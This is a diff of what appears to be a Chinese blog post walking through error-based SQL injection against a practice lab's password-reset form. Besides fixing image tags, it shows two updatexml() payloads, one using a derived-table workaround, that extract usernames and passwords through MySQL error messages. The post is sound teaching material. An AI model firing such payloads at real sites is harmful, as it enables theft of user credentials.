@@ -202,7 +202,7 @@
 <img src="/2019/08/13/error-based-injection/2.png" title="pic2">
 
 <p>由上可见，这里使用的post请求方式，post部分内容分别使用了uname、passwd和submit三个变量来提交数据，放行后页面如下，表示修改重置密码成功。</p>
-
+<img src="/2019/08/13/error-based-injection/3.png" title="pic3">
 
 
 
@@ -238,7 +238,7 @@
 
 
 <p>如下图，页面报错结果为：XPATH syntax error: ‘#5.5.53’。</p>
-
+<img src="/2019/08/13/error-based-injection/5.png" title="pic5">
 
 
 
@@ -249,7 +249,7 @@
 <p><strong>payload1:</strong> </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or updatexml(1,concat(&apos;#&apos;,(select concat(id,&apos;#&apos;,username,&apos;#&apos;,password) from users limit 0,1)),0)#</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2019/08/13/error-based-injection/6.png" title="pic6">
 
 <p>结果：You can’t specify target table ‘users’ for update in FROM clause</p>
 <p>这里我试图查询users表中的id、username和password的第一行数据，但这里却弹出错误提醒。</p>
@@ -260,7 +260,8 @@
 <p> <strong>payload2:</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or updatexml(1,concat(&apos;#&apos;,(select * from (select concat_ws(&apos;#&apos;,id,username,password) from users limit 0,1) a),&apos;#),0)#</span><br></pre></td></tr></table></figure>
 
-<p><img src="error-based-injection/7.png" alt="pic7"></p>
+<img src="/2019/08/13/error-based-injection/7.png" title="pic7">
+
 <p>结果：XPATH syntax error: ‘#1#Dumb#Dumb’，成功爆出数据（上面使用concat_ws()和concat()都可以）</p>
 <p>解释：这里的<strong>a</strong>：<strong>(select concat_ws(‘#’,id,username,password) from users limit 0,1)</strong>就是<strong>派生表</strong>，而select * from a就相当于查询a语句本身结果的内容。</p>
 <p>即“select concat_ws(‘#’,id,username,password) from users limit 0,1”等价于 “select * from a”。</p>
